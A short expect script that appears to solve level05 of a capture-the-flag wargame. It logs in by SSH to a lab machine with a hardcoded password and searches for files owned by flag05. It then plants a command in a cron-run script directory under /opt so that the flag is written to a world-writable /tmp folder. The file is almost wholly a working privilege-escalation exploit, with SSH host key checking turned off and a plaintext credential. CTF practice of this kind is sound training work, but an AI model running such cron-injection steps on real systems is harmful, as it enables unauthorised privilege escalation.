#!/usr/bin/expect -f
set ip 192.168.1.103
spawn ssh -o "StrictHostKeyChecking no" level05@$ip -p 4242 "find / -user 'flag05' -print 2>/dev/null -exec cat \{\} \\\; | head -7 ; find / -name level05 -print 2>/dev/null -exec cat \{\} \\\; | head -2 ; mkdir -p /tmp/level05 ; cd /tmp/level05 ; chmod 777 . ; echo 'getflag > /tmp/level05/flag' > /opt/openarenaserver/level05.sh ; sleep 125 ; cat /tmp/level05/flag"
expect "sword:"
send "ne2searoevaevoem4ov4ar8ap\r"
interact
